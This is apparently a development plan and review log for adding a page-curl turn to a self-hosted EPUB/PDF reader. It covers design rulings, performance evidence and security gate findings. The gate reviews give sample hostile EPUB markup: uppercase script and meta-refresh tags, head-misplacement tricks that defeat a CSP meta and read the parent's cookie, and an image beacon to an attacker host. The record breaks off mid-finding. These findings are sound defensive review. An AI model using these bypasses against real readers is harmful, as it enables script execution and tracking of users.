---
plan: book-page-turn
harness: v2 · full
branch: feat/v1.402.0-book-page-turn
anchor: spec
status: Building
next: the gate (adversary + qa + security-brief) on the build; then the release (Step 6)
design: Rulings approved by Dean 2026-11-03 (AskUserQuestion, after three prototype rounds): P1-P8 below; the builder's Design must stay inside them
gate: pending (adversary + qa + security-brief: the release's package.json bump matches the deps rule, and P9 changes the chapter frame's security boundary)
builder: smart
---

# v1.402.0 - books turn like paper: drag a page and it curls over, in one-page and two-page views, for EPUB and PDF

Kickoff 2026-11-03 (FileTube Root, Opus). **Builder: Smart (Opus).** Why the tier: it re-plumbs how the reader holds
pages (one epub.js view becomes a pool of views, and PDF goes from a scroll column to pages), it moves touch input
into the book's iframe, and its success is about frame time and feel on a phone, which no unit test sees. It changes no
stored data and no server route.

## Why

Dean, 2026-11-03: the reader is "very functional utilitarian". He wants turning a page with your thumb to look like a
sheet of paper folding over, two open pages when the phone is sideways, mouse dragging on the web too, and the existing
arrows and tap-to-turn kept. "If this thing is going to be your locally hosted Kindle alternative ... it should feel
like it." No font or typography change.

## The prototype is the spec for the look and feel

Three rounds with Dean on a standalone prototype (claude.ai artifact "Page Turn Lab"; the source is committed beside
this plan as `docs/references/page-turn-prototype.html`). Round 1 he found it laggy and glossy; round 2 he approved
the speed and look ("The graphics are good. The speed of it is good"); round 3 fixed the trigger ("I like it. Seems
good!"). **Port its engine; do not redesign it.** What the prototype settled:

- **Geometry.** Each turn has a leaf (the turning sheet) hinged on the spine (one-page view: the page's left edge;
  two-page view: the center). The dragged corner C (top or bottom, chosen by where the drag starts: above 42% of the
  page height = top) moves to P. The fold is the perpendicular bisector of C-P. The part of the leaf past the fold is
  mirrored across that line and becomes the sheet's back. P is held within one page width of the spine at the corner's
  height, and within the page diagonal of the opposite spine corner, so the sheet never tears. Progress a in [0, 1]:
  P.x = W - 2Wa. The corner lifts by `0.075 * H * lift * sin(pi * a)` (lift from the approved Book paper values below).
- **Compositor-only frames (the round-2 fix; this is the non-negotiable part).** Everything a turn shows is built and
  painted BEFORE the turn. A frame changes only `transform`, `opacity` and `visibility`. The fold is a large div with
  `overflow: hidden` rotated so its edge lies on the fold line (local y axis away from the fold, into the side still
  seen); inside it the leaf's front and back sit in counter-transformed wrappers. The crease shade, the shade on the
  uncovered page, and the lifted sheet's soft shadow are pre-built gradient / box-shadow layers that are only moved,
  scaled and faded. No canvas drawing, no blur, no `clip-path` change, no text relayout during a turn. Measured: v1
  (canvas + clip-path) had 83-300 ms frames under a 4x CPU throttle; v2 holds 16.7 ms on a phone viewport with about
  2 ms of main-thread work per frame (the rest is compositing, the GPU's job on a device).
- **Two rigs, double-buffered.** One rig per direction (forward, back), both built at layout time, both at rest showing
  the same picture; the one for the drag's direction comes to the top. After a page lands, the hidden rig is re-pointed
  to the new place, given two frames to paint, then swapped up; the landed rig is re-pointed behind it. A turn never
  starts on a rebuild.
- **Trigger (round 3, Dean: "toward like the 30% mark").** The curl's progress is finger travel / (2 x page width)
  (the corner stays under the finger). On release: TURN if travel >= 30% of the page width and the release speed is
  not a pull back (> -0.4 page widths/s), or on a flick (> 1.2 page widths/s with travel > 4%); otherwise fall back.
  Speed is measured over the last 70 ms of samples, and is zero if the finger had been still for 80 ms before lifting.
  A drag is recognized after 6 px of mostly-horizontal movement.
- **Settle.** A critically damped spring on progress, omega = 17 x speed / paper duration, started with the finger's own
  speed, so letting go never jerks. A tap or arrow starts the same spring from rest with an initial speed of 2.4.
  Touching a page mid-flight catches it under the finger; a tap during a turn lands it and starts the next (quick taps
  chain).
- **Matte, no gloss (Dean round 1: "I don't like the shimmer ... this kind of glow").** No white highlight, no paper
  grain, no sheen. The crease darkens and fades; nothing remains once a page lies flat (every shade fades to zero at
  a = 0 and a = 1, so the landed frame equals the resting frame exactly).
- **The one-page back** shows the front's own text mirrored at 12% (show-through) on the theme's paper; the two-page
  back is the next page (left) or previous page (right). A PDF's back is the scan's paper whatever the reader theme.
- **Page-edge stacks**: up to 7 stacked edges, read pages on the left, remaining on the right, from the book's percent.

The prototype's Tune panel was for finding values. **The product ships the approved values with no tuning UI** (the
Root's call, not a Dean ruling: say so in the gate brief; if Dean asks for a setting later, it is a follow-up).
Approved values: paper Book (lift 1, shadow blur 18, duration 1), shadow 60%, show-through 12%, settle speed 100%,
turn after 30%.

## Rulings (Dean, 2026-11-03)

- **P1 - the curl is the turn.** No Slide, no None (Dean: "I definitely want it to be page, the curl"). Except P5.
- **P2 - arrows and tap stay.** The bottom-bar controls, the edge tap zones and the arrow keys stay; each plays the same
  curl (P1).
- **P3 - two pages sideways.** Two open pages when the reader is wider than tall and at least 640 px wide (the
  prototype's Auto); one page otherwise. The leaf turns over the spine. Replaces epub.js's `minSpreadWidth: 800` rule
  (read.js ~506): pick one rule for both formats; keep phones in portrait strictly one page.
- **P4 - PDF turns pages; Scroll stays as a choice.** PDFs open paged, with the same curl and two-page view. A
  "Scroll pages" choice in the reader's menu brings back today's scroll column (`openPdf`'s current behavior, kept
  as-is). The choice is remembered per device (a `filetube_reader_*` localStorage pref beside FONT_KEY/THEME_KEY).
- **P5 - Reduce Motion = instant turn.** With `prefers-reduced-motion: reduce`, a drag past the trigger, a tap or an
  arrow changes the page at once. No curl, no spring.
- **P6 - drag from anywhere on the page.** A quick sideways drag anywhere on the page turns it; a long press still
  selects text; a tap on a link still follows it. Mouse drag works the same on the web.
- **P7 - no font or typography change.** Themes (Paper / Sepia / Night) and font size are today's.
- **P8 - the reader's place is exact.** The saved locator (CFI + spineIndex + blockIndex for EPUB, page for PDF),
  Listen from here, the TOC, chapter follow for narration, and "From the beginning" behave exactly as today. A turn
  that falls back saves nothing.

- **P9 - the chapter frame is guarded by a script-blocking policy, not the no-scripts sandbox (Dean, 2026-11-03,
  AskUserQuestion at the Step 1 stop rule).** WebKit runs no parent listener on a sandboxed no-scripts document
  (Evidence, Step 1), so the reader cannot hear a drag on the iPhone. The ruling: epub.js runs with
  `allowScriptedContent: true` (sandbox `allow-same-origin allow-scripts`, so top navigation, popups and forms
  stay blocked) and every chapter document gets, before any book markup is parsed, a
  `Content-Security-Policy` meta that refuses all script, plus the book's own `<script>` elements and inline
  `on*` handlers stripped from the document epub.js serializes. Long-press selection and link taps keep working.
  This replaces hard part 2's "never add allow-scripts" line; the policy is now the one defense, so the gate
  runs the full security seat on it.

## The hard parts (each is a stop-and-measure point)

1. **epub.js has one view; the curl needs several pages at once.** Today `book.renderTo(pane, { flow: 'paginated',
   spread: 'auto' })` makes one rendition, and a page turn is a scroll inside its iframe (`rendition.next()`). The rigs
   need, per direction, the page under, the leaf's front and its back (two-page view: up to six pages, L-2 .. L+3).
   **The proposal to prove in Step 1:** a pool of single-page renditions of the one `Book` (`spread: 'none'`, each
   sized to one page), each parked on a page by `display(cfi)` + `next()`/`prev()`, all sharing theme and font so they
   paginate identically. Prove: (a) several renditions of one Book coexist and each holds its own place; (b)
   re-pointing a hidden view across a chapter boundary finishes before it is needed (async; it loads a new iframe);
   (c) a re-pointed view never flashes blank when shown (two-frame paint rule above); (d) memory on Dean's iPhone with
   the pool open on a big book. If the pool cannot meet (a)-(d), STOP and ask Dean (AskUserQuestion) with measured
   numbers. Do not fall back to snapshotting the page as an image without asking (the text would blur and stop being
   selectable).
2. **Touches inside the book's iframe.** epub.js renders each chapter in an iframe sandboxed `allow-same-origin` only
   (`allowScriptedContent: false`, read.js ~507; vendored source: `sandbox="allow-same-origin"`). The parent must see
   the drag. Attach pointer listeners to each view's document through `rendition.hooks.content` and map coordinates to
   the pane. **Prove they fire in WebKit** (desktop Safari and Dean's iPhone): listeners added from the parent to a
   sandboxed no-scripts document are the exact "plausible but silently inert" class (LESSONS 2, 11). Keep
   `allowScriptedContent: false`: never add `allow-scripts` to make this work (that lets a book's own JavaScript run).
   If the listeners are inert in WebKit, STOP and ask: the fallback is a gesture layer over the pane, which costs text
   selection in the middle of the page (P6).
3. **Selection versus drag (P6).** A horizontal move of 6 px before a long-press fires is a turn; a long press with no
   move is iOS selection; a tap on an `<a>` follows it. `touch-action` on the views must stop the browser's own
   horizontal pan without killing vertical scroll elsewhere. Verify on the device; the headless browser cannot show
   iOS selection.
4. **The place (P8).** The turn engine moves pictures; epub.js's own `relocated` stays the source of the locator. After
   a turn lands, the CURRENT view must be the one whose `relocated` feeds `queueProgressPing`, and the hidden views
   must never send a progress ping (a parked "next" view would save the wrong place). Listen from here reads the
   current view's document (blockIndexForNode). Theme and font changes apply to every view in the pool, then the pool
   re-parks from the current view's CFI.
5. **PDF paged (P4).** pdf.js already renders a page to a canvas; a page viewer is a canvas re-rendered when re-pointed
   (render ahead: current +-3). Keep `renderPage`'s device-pixel-ratio sizing. The cover backfill and page locator
   are unchanged.
6. **Frame rate.** iPhone web views run page animations at 60 fps by default even on 120 Hz screens, as far as the
   Root knows; it is unverified whether the FileTube iOS app can raise it. Investigate and REPORT (no iOS change in
   this plan: if the app can unlock 120 Hz, the Root relays it to the iOS Root). The acceptance bar is 60 fps with no
   dropped frames.

## Step 0 (before any code)

- Read AGENTS.md, docs/LESSONS.md (sections 1, 2, 3, 4, 6, 11 at least, and the epub.js entries: srcdoc positions,
  the "Chapter <spine + 1>" label lesson), docs/CONTRIBUTING.md, docs/RELEASING.md, `public/js/read.js` whole,
  `public/read.html`, the reader CSS in `public/css/style.css` (~7740-7900), `docs/references/page-turn-prototype.html`
  whole (the engine you are porting), then this plan once.
- Environment: `export PATH="$HOME/.local/share/fnm/node-versions/v22.23.1/installation/bin:$PATH"` before every
  npm/node/git command. Local suites on Node 22 only; Node 24 runs in PR CI.
- Git: work on `feat/v1.402.0-book-page-turn` (this plan is committed there). Stage by name, never `git add .`/`-A`,
  never force-push, never `--no-verify`, never pipe a commit or push; verify with `git log` / `git ls-remote`. Commit
  with `-F <file>`. Push with `GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20 -o ServerAliveCountMax=60"`.
- Tests: targeted tests per wave; the full Node 22 suite once before the gate and once on the release commit.
- No dependencies: the turn engine is vanilla JS in this repo (Dean's 5-10 year rule). No page-flip library.
- **Stop rules (ask Dean with AskUserQuestion):** Step 1 fails (a)-(d) or hard part 2; a ruling turns out unbuildable;
  a frame-time or memory number misses the acceptance below on the device; gate round 3. A device check failing after
  release is a re-root-cause, never a re-patch.

## Steps

1. **Spike (throwaway branch or a scratch page, not merged):** the epub.js pool (hard part 1, a-d) and the iframe
   listeners in WebKit (hard part 2), on a real EPUB from Dean's library and on Playwright WebKit. Write the measured
   results into this plan's Evidence section. Only then design the module.
2. **The turn engine** as its own module (e.g. `public/js/page-turn.js`): geometry, rigs, spring, trigger, input,
   reduced motion. It takes page viewers through a small interface (point at a page, element, ready) so EPUB and PDF
   share it. Pure parts (the fold math, the trigger decision, the spring step) are node:test-covered with the
   prototype's values as fixtures.
3. **EPUB viewers** (the pool) and **PDF viewers** (canvases) behind that interface; wire into `openEpub`/`openPdf`
   returning today's adapter shape (`next`, `prev`, `goToSpine`, `setFontSize`, `setTheme`, `refit`, `destroy`).
   Tap zones, bottom-bar arrows and keys call the engine's animated turn (P2).
4. **PDF Scroll choice** (P4) in the reader menu (`readerMoreMenuItems`), remembered per device; Scroll = today's
   `openPdf` unchanged.
5. **Reader CSS** for the book look (spine shade, page-edge stacks, the desk around a two-page spread), tokenized per
   the UI ratchet (`npm run lint:ui`; new literals tokenized or `token-exempt` with a reason).
6. Release per docs/RELEASING.md: version 1.402.0, ROADMAP "Shipped" entry, `docs/releases.json` ledger in user
   language, a LESSONS entry if the wave paid for one, DEVICE-CHECKS "Page turn (v1.402.0)".

## Acceptance

- **Frames:** a scripted drag in headless Chromium (phone viewport, 4x CPU throttle) shows main-thread work at or
  under 4 ms per frame and **zero Paint events for page content during the drag** (Chrome trace, as the Root's
  `ptl-trace` probe did); the probe is committed under `scripts/` and its output pasted into Evidence.
- **Trigger:** automated release cases in Chromium AND WebKit, the prototype's set: slow drags to 8% / 25% stay; 32%
  / 45% turn; a 12% flick turns; pull back from 32% and from 45% stays. All seven pass in both engines.
- **Landing:** the frame after a page lands is pixel-identical to the resting frame of the new place (screenshot diff
  in one engine), both directions, one-page and two-page, EPUB and PDF.
- **Place (P8):** a test proves hidden pool views never call the progress ping; turning forward 5 and back 2 saves
  the locator of the visible page; Listen from here starts at the visible page's block.
- **Reduce Motion (P5):** with reduced motion emulated, a turn changes the page in one frame.
- **Device (Dean, the arbiter):** DEVICE-CHECKS "Page turn (v1.402.0)": (a) portrait drag at 30% turns, smooth, no
  hitch at the start or end; (b) sideways two pages, both directions; (c) a quick flick; (d) a pull back cancels; (e)
  a long press still selects text and a link still opens; (f) tap zones and arrows curl; (g) a chapter boundary turn
  looks like any other turn; (h) a PDF turns, and Scroll pages brings back the column; (i) Reduce Motion on = instant;
  (j) closing and reopening the book lands on the same page; (k) a big book stays smooth after 50 turns.

## Out of scope

Tuning UI; new fonts; a native (UIKit) curl in the iOS app; changing the locator format; TTS changes; 120 Hz work in
the iOS app (report only, hard part 6).

## Evidence

(builder: Step 1 spike results, then the acceptance outputs, verbatim with counts)

### Step 1 spike (2026-11-03, builder; scratch page, not merged)

Book: War and Peace, Project Gutenberg EPUB 3 (`2600.epub3.images`, 1.8 MB, 368 spine items) - no library EPUB
is on this box, so a real producer's book stands in for "a real EPUB from Dean's library". Vendored epub.js +
JSZip, `book.renderTo(slot, { flow: 'paginated', spread: 'none', allowScriptedContent: false })` per view,
390x700 slots, Playwright 1.62 (webkit-2248 / chromium headless shell 1234), headless, this box.

- **(a) several renditions of one Book, each holding its own place:** PASS (WebKit). 8 renditions parked on
  spine 5-8 pages 1-2: placed `["5:1/7","5:2/7","6:1/9","6:2/9","7:1/7","7:2/7","8:1/5","8:2/5"]`, re-read after
  all eight moved: identical, 8 distinct CFIs, `stable: true`. Pool open 95 ms (WebKit), 81 ms (Chromium).
- **(b) re-point time (WebKit, 10 samples each):** same-chapter `next()` median 17 ms, max 34; cross-chapter
  `next()` median 54 ms, max 85 (n = 10); `display(spineIndex)` median 47 ms, max 69.
- **(c) no blank when shown:** PASS (WebKit). A hidden view re-pointed across chapters and brought to the top at
  promise-resolve + 0 frames and + 2 frames: screenshot PNG sizes 97-118 KB (r0) and 106-120 KB (r2) against
  2397 bytes for a blank paper slot (6 samples each). The two-frame rule stays as the margin.
- **(d) memory (headless, this box; the iPhone number is a device check):** whole-browser RSS with views parked
  on 1 / 6 / 8 different chapters: WebKit 383.8 / 393.6 / 398.6 MB (+14.8 MB for 8); Chromium 425.8 / 449.7 /
  455.4 MB (+29.6 MB for 8).
- **Hard part 2 - parent listeners on the chapter document: INERT IN WEBKIT (the stop rule).** Listeners the
  parent adds to an epub.js chapter document (`sandbox="allow-same-origin"`, the vendored source's value with
  `allowScriptedContent: false`) never fire in WebKit: 0 events for a mouse drag, a mouse click and a touch tap,
  on `document` and on `window`, and epub.js's own `rendition.on('click'|'touchstart'|...)` relay got 0 too;
  even a synthetic `dispatchEvent` from the parent ran no listener. A plain `srcdoc` control iframe with the same
  sandbox: 0 events in WebKit; the same control without a sandbox: every event. Chromium and Firefox deliver all
  events to the sandboxed document (`pointerdown, touchstart, pointerup, touchend, mousedown, click`).
- **Measured alternative (for Dean's ruling, not built):** an unsandboxed `srcdoc` document whose head starts
  with `<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none'">`: parent
  listeners fire in WebKit, Chromium and Firefox (`pointerdown, touchstart, pointerup, touchend`), and its
  inline `<script>`, `onerror=` handler and `javascript:` link ran in NONE of the three engines (the same
  payload in an unprotected control ran all three: `["open-inline","open-onerror","open-jsurl"]`).

### Build evidence (builder, 2026-11-03)

Commits: d80b817a (engine, pool, paged PDF, P9, CSS, probe), 4c5c7a17 (in-book links), then the evidence commit.

**Full Node 22 suite** (`npm test`, Node v22.23.1, on 4c5c7a17): `# tests 13202`, `# pass 13189`, `# fail 0`, `# skipped 13`,
`# duration_ms 551969.681187`, exit 0. After it, one line of page-turn.js changed back (page boxes placed with `translate3d`, see
landing) and the probe got a settle wait; `node --test test/unit/page-turn.test.js test/unit/books-reader-ui.test.js`: `# pass 45`,
`# fail 0`. `npm run lint:ui`: "ui-lint: OK - the live debt equals docs/ui-exceptions.json" (TOTAL 3142, unchanged).
`node scripts/overlay-containment-lint.js --enforce`: "overlay-containment: clean (0 violations)".

**Mutants (each in place, restored byte-identical, the named test red):** the P8 `isCurrent` gate on relocated -> "reader P8: a
parked pool view moving (epub.js relocated) never saves the place" red; CSP meta appended instead of first -> "P9
hardenChapterDocument: the policy is the FIRST element" red; on* match made case-sensitive -> same test red; the landed rig's
`ready = false` removed -> "a tap while the rig repaints waits for it" red; the pending tap dropped -> same test red; `isCurrent`
always true -> "isCurrent names ONLY the viewer..." red; the queued release of a drag before its rig is ready removed -> "a
sideways drag released before its rig has repainted still turns" red. 7 of 7 killed.

**Acceptance, `node scripts/page-turn-probe.js <mode>`** (real server, generated EPUB of 4 chapters x 22 paragraphs and a 12-page
PDF; Playwright 1.62, Chromium headless shell 1234 and WebKit 2248; 390x844 phone, 1100x760 for two pages):

- **Trigger** (`trigger both`, every drag pressed in the page's TEXT, so in an EPUB it is heard through the chapter document): Chromium
  7/7 and WebKit 7/7 - slow 8% stays, slow 25% stays, slow 32% turns, slow 45% turns, flick 12% turns, pull back from 32% stays,
  pull back from 45% stays; page errors 0.
- **Landing** (`landing chromium`, rAF held at the landing frame, then released; the twin rig swaps up): 8/8 at 0 differing pixels -
  EPUB one-page forward / back (249168 px), EPUB two-page forward / back (460248 px), PDF one-page forward / back (165754 px), PDF
  two-page forward / back (375666 px), max delta 0. (Built on two fixes the probe forced: the mirrored two-page back is its own
  compositor layer, and page boxes stay `translate3d` layers; with a 2D translate the EPUB spread measured 3865 / 2346 px at delta 1.)
- **Place (P8)** (`place both`): 5 forward and 2 back = place 1:3 in both engines; the last saved locator's blockIndex equals the first
  block on the visible page (Chromium 11, "c1p10w0 c1p1", 4 blocks on the page; WebKit 18, "c1p17w0 c1p1", 3 blocks) - the block
  Listen from here starts at. Hidden views: the unit test above (6 parked renditions fire relocated, the saved place is the visible one's).
- **Reduce Motion (P5)** (`reduced both`, emulated): an arrow changes the page inside the key event itself (Chromium and WebKit); a 35%
  drag never folds the leaf (the fold transforms are identical across every sample) and lands on release. A drag that starts while the
  rig is still repainting the previous turn's neighbours lands once the rig is ready (a few frames).
- **Frames** (`frames chromium`, 4x CPU throttle, 390x844, a 40-move drag, Chrome trace; main-thread work = the union of the work
  events' intervals - input dispatch, script, style, layout, paint, layerize, commit, hit tests, microtasks, GC - per animation frame):
  EPUB from the tap zone: 132 frames, interval median 16.7 / p95 16.8 / max 16.8 ms, 0 over 20 ms, 1.70 ms/frame, **3 Paint events**;
  EPUB from the page text: 139 frames, 16.7 / 16.7 / 16.8 ms, 0 over 20 ms, 1.66 ms/frame, **3 Paint events**; PDF: 96 frames,
  16.7 / 16.7 / 16.8 ms, 0 over 20 ms, 2.52 ms/frame, 0 Paint events. Main-thread work passes (<= 4 ms) everywhere; **the EPUB misses
  "zero Paint events"**: one burst of 3 records (the document, the fold mask, the front page) on the first folded frame of the turn,
  never again during the drag. Diagnosis, each by a discriminating run: not the press or recognition work (frames kept running from
  before the press: still there), not the mouse pointer-events switch (moved to the press: still there), not the mask's resting pose
  (a 45 degree, a 90 degree limit and a tilted pose: still there), not the leaf's back being transparent (0.002 opacity: still there);
  it is chapter length - with one-page chapters the burst is 0. The approved prototype, traced the same way: **42** Paint events for
  its book during a drag, 2 for its PDF.
- **P9** (`csp both`, a chapter with an inline script, an onerror image, a javascript: link (clicked), an SVG script and an onclick
  paragraph (clicked)): book code that ran `[]` in Chromium and WebKit; the frame's sandbox `allow-same-origin allow-scripts`, its
  head's first element the Content-Security-Policy meta, 0 scripts, 0 inline handlers; a drag pressed on the hostile page's text turned it.
- **PDF Scroll pages (P4)** (`pdfscroll both`): More > Scroll pages brings the 12-page column back and remembers `scroll`; Turn pages
  returns to the turning pages on the page the column was on and remembers `pages`. Chromium: paged on page 3, the column settled on
  page 2 (the kept scroll column scrolls before the canvases around the page have rendered: one page early, pre-existing, ROADMAP);
  WebKit: page 4 -> column page 4 -> paged 33%.
- **In-book links** (`link both`): a tap on a link to part three jumps the whole pool (1:0 -> 2:0), the page shows "Part three", and the
  next turn shows part three's second page in both engines. (epub.js hands display() "../ch2.xhtml", which its spine never matched: in-
  book links did nothing before this.)
- **Smoke** (`smoke both`): EPUB 6 viewers / 6 frames, PDF 6 canvas viewers, a drag turns and an arrow turns back, both engines, 0 errors.

**Hard part 6 (120 Hz, report only).** The turn is driven from requestAnimationFrame (the spring), so it runs at whatever rate WebKit
gives the page. Public reports say WKWebView caps page rendering updates near 60 fps through the WebKit preference
PreferPageRenderingUpdatesNear60FPSEnabled (on by default in WKWebView); `CADisableMinimumFrameDurationOnPhone` is reported NOT to lift it;
the only known lever is a private WKPreferences feature toggle (App Store risk), and reports conflict on current OS versions. Unverified
on Dean's iPhone; relayed to the iOS Root as a question, with a one-line on-device rAF-rate probe as the way to settle it.

Gate: APPROVED r1 @439b7150 — security-brief

P9 verdict: the chapter frame (sandbox `allow-same-origin allow-scripts`, no allow-popups/allow-top-navigation/allow-forms)
is soundly contained against a malicious EPUB reaching the parent origin. Traced at source: `hardenChapterDocument` runs via
`book.spine.hooks.content` in `Section.load()` (epub.min.js) BEFORE `render()` serializes `documentElement`, so the CSP meta is the
first head child in the serialized output. epub.js's own link handler sets `target=_blank` on absolute (`://`) links (blocked by the
no-allow-popups sandbox) and preventDefaults relative links into `display()`, which read.js wraps so `resolveBookLink` rejects any
`scheme:` target and any non-spine href. `frame-src/child-src/object-src 'none'` block nested frames/objects/embeds (so the app's own
pages cannot be framed inside a chapter). The session cookie is HttpOnly (lib/auth/gate.js:89). No same-origin HTML/script-reflection
sink exists for a navigated frame to land on (the book bytes serve as epub+zip/octet-stream, not HTML). The spike's `csp both` proof
(inline script, onerror, javascript: link, SVG script, onclick — all `[]` in Chromium + WebKit) is consistent with the traced design.
No CRITICAL/HIGH.

WARNING (fix-or-accept) — meta-refresh strip is case-sensitive, defeated by XML/HTML casing differential (read.js:119-121). The
chapter DOM is XML (EPUB XHTML, `application/xhtml+xml`), where `getAttribute('http-equiv')` is case-sensitive; the srcdoc is reparsed
as HTML, where attribute names are case-insensitive. A book element `<meta HTTP-EQUIV="refresh" content="0;url=...">` (or any mixed
case) is NOT matched by the strip, survives into the HTML-parsed frame, and the refresh FIRES on chapter load — no click needed. This
CSP does not constrain the navigation (no `default-src`/`navigate-to`). Containment holds: a remote/`data:` target is cross-origin or
opaque (SOP + sandbox keep it off the app origin) and the cookie is HttpOnly, so this is NOT a parent-origin compromise — impact is an
auto-firing beacon / reader-pane hijack (a phishing surface) on open. Fix: match `http-equiv` case-insensitively (scan attributes), or
neutralize meta refresh robustly.

NOTE (defense-in-depth) — the `<script>` strip is also case-sensitive: `getElementsByTagNameNS('*','script')` matches only lowercase
`localName` in an XML DOM, so `<SCRIPT>` survives the strip and becomes an executable `<script>` on HTML reparse. It is neutralized ONLY
by CSP `script-src 'none'`; the strip is illusory for mixed case (read.js:118). Acceptable while CSP holds (the plan calls the policy
"the one defense"), but the belt is not doing its job.

NOTE — no `default-src`, so `img-src`/`style-src`/`connect-src`/`media-src` are unrestricted. A malicious book beacons on open via
`<img src="http://attacker/?t=open">` or CSS `url()`, leaking owner IP/open-time (read.js:112). PRE-EXISTING (the old
`allow-same-origin` sandbox already loaded remote images), not a P9 regression; P9 was the moment to tighten. Suggest
`default-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; connect-src 'none'` plus the existing
directives. Low for a solo self-hosted reader.

NOTE — epub.js's `a[href]` link munging misses `<area href>` and SVG `<a xlink:href>`; these can self-navigate the chapter frame on a
click to a `data:`/remote document. CSP blocks `javascript:`, and the destination is cross-origin/opaque (no reach to parent
cookies/DOM/APIs, cookie also HttpOnly). Contained; requires a click; low.

INFO — scripts/page-turn-probe.js ships in the image (Dockerfile:109) and calls `server.__mintTestSession` (mints a real admin cookie).
NOT network-reachable: only a process that `require()`s server.js can call it, and the probe boots its own throwaway server on a temp
DATA_DIR (it never touches the real data dir). Pre-existing test-export pattern (server.js:7730 comment). No remote exposure.

Gate: CHANGES r1 @439b7150 — qa

- CRITICAL (P9, read.js hardenChapterDocument ~L111-140): the CSP meta is defeated whenever the HTML parser leaves the
  book's `<head>` behind other content, and then book code runs same-origin with the reader. Verified on the real server
  and reader (sandbox `/tmp/qa-v1402-sbx/qa/p9.js`, one-chapter XHTML EPUBs): (1) `<html><body>...<SCRIPT>top.x=..</SCRIPT>
  </body><head/></html>` - the uppercase SCRIPT survives the strip (XML DOM is case-sensitive), the HTML parser puts the
  meta in `<body>` where it is ignored: RAN in Chromium AND WebKit, and read `top.document.cookie`; (2) the same body-first
  order with a lowercase `<iframe srcdoc="<script>...">` (nothing to strip): RAN (Chromium); (3) head FIRST in the XML,
  only a CDATA before it: `<html><![CDATA[><iframe srcdoc="..script..">]]><head>` - the HTML parser ends the bogus
  comment at the first `>`, opens body, and the meta lands in body: RAN in Chromium AND WebKit. Control (head first,
  uppercase SCRIPT): blocked. Fix: make the policy the first bytes the HTML parser sees (a book.spine serialize hook
  that prefixes the meta to section.output, or drop every node before <head>, every CDATA/comment/PI, and move head
  first), and extend the probe's csp mode with these three chapters in both engines; the unit test checks the XML DOM
  only, never what the frame's parser builds (presence, not binding).
- WARNING (P8 regression, read.js displayAnchor ~L340-351 + renderToc ~L864): a jump whose target epub.js refuses now
  falls back to `display()` = the book's START and SAVES it. Before: a TOC tap was `display(href).catch(() => {})`, a
  no-op. Verified (`/tmp/qa-v1402-sbx/qa/toc.js`, Chromium): EPUB with its nav in a sub-folder (hrefs "../Text/c2.xhtml",
  the very class 4c5c7a17 diagnosed for links): place 1:4, saved block 14 -> tap "Chap 2" -> shows "Chap 0", saved
  `{spineIndex:0, blockIndex:0}`: the bookmark moved to page 1. Same path for `here()` (font change, refit) since it
  carries no spine. Fix: TOC through resolveBookLink (null = stay put); the start fallback only for the open-time resume.
- WARNING (lying comment, read.js ~L101-106): "every <script> element ... is removed", "every <meta http-equiv=refresh>
  is removed" and "so it governs everything the parser meets after it" are false for XHTML chapters: `<SCRIPT>` and
  `<META HTTP-EQUIV="Refresh">` survive (verified: a refresh to about:blank#refreshed navigated the chapter frame,
  Chromium), and the meta does not govern content the parser places before it (above).
- NOTE (read.js ~L574-576): "Exported shape for the tests: epubLocationReport(location, contents)" - it is not exported
  and takes (book, location, contents).
- NOTE: the v1.37.3 first-paint re-measure nudge (rAF rendition.resize after display, "desktop pages sometimes EMPTY
  until a tap") was removed without a word; headless cannot show it - add it to the device checks or say why it is moot.
- NOTE: Evidence calls the Chromium column landing a page early "pre-existing, ROADMAP" - ROADMAP has no such entry.
- NOTE: the Acceptance "zero Paint events" line is missed for EPUB (3 records, once, first folded frame); better than
  the approved prototype (42), but an acceptance miss is Dean's to waive - put it to him, do not self-waive.
- NOTE: 'filetube_reader_pdf_layout' is a literal three times beside PDF_LAYOUT_KEY; resolveBookLink's suffix match
  picks the first same-named file in another folder.
Measured (Node 22.23.1): `npm run lint` 0 errors, 6 warnings (all common.js, pre-existing); `npm run lint:ui` OK, TOTAL
3142; overlay-containment clean (0 violations); page-turn + books-reader-ui + books-router-nav + pocket-kb-search +
shortcut-typing-guards: 98 tests, 98 pass, 0 fail; `page-turn-probe.js place both`: PASS both (Chromium block 11,
WebKit block 18).

Gate: CHANGES r1 @439b7150 — adversary

Measured on a /tmp `git archive HEAD` sandbox (worktree untouched), Node 22.23.1, Playwright Chromium 1234 + WebKit 2248, the real
server via scripts/page-turn-probe.js's own boot/openReader. Instruments: targeted suites 98/98 pass; `npm run lint:ui` OK (3142,
unchanged); overlay-containment clean (0); eslint on the four new/changed JS files: 0 problems.

- CRITICAL C1 (P9, read.js hardenChapterDocument): the policy is "first in <head>" only in the XML DOM. epub.js parses a .xhtml
  chapter as application/xhtml+xml (epub.min.js request: "xhtml" -> parse(..., "application/xhtml+xml")), the hook runs, XMLSerializer
  writes it, and the frame's srcdoc re-parses it as HTML. Any content before <head> (a stray element or text) makes the HTML parser
  open <body> early and the meta lands in <body>, where both engines ignore a CSP meta. Repro (benign indicator: the test page itself
  appends an inline <script> to the rendered chapter document; a policy in force refuses it): a 2-chapter EPUB whose chapter 2 is
  `<html xmlns=".../xhtml"><div>before head</div><head><title>x</title></head><body>...</body></html>`, opened in the real reader:
  Chromium and WebKit both `{"chapter":"Normal","metaParent":"HEAD","inlineRan":false}` vs
  `{"chapter":"Shape","sandbox":"allow-same-origin allow-scripts","metaParent":"BODY","inlineRan":true}`. jsdom/parse5 agree for
  textBeforeHead, elemBeforeHead, bodyBeforeHead and an SVG-root spine item (meta parent BODY); normal and no-head are fine. With the
  policy off, javascript: URLs and nested frames are not touched by the strip, so the strip alone does not stand in for it (qa's
  rows show full execution). The csp probe only uses a well-formed head-first chapter, so it is a divergent fixture.
  Prescription: harden the document the frame will actually parse - in a serialize step, re-parse the output as text/html, strip
  and insert the meta there, and re-serialize; then assert (in the hook, in a unit test that round-trips XML -> XMLSerializer ->
  HTML parser, and in the probe) that the meta is head's first element after the HTML parse. Add these chapter shapes to `csp`.
- WARNING W1 (P9): the strip compares in XML terms, case-sensitively. `<SCRIPT>` and `<META http-equiv="refresh">` survive
  hardenChapterDocument (jsdom: after the srcdoc parse "scripts 1 | refresh metas 1"). End to end with a well-formed head-first
  chapter: the uppercase SCRIPT is in the frame (blocked by the policy, fine), but the uppercase refresh FIRES: after ~2 s the
  chapter frame's location is `http://127.0.0.1:<port>/robots.txt` in Chromium AND WebKit - the chapter frame leaves the hardened
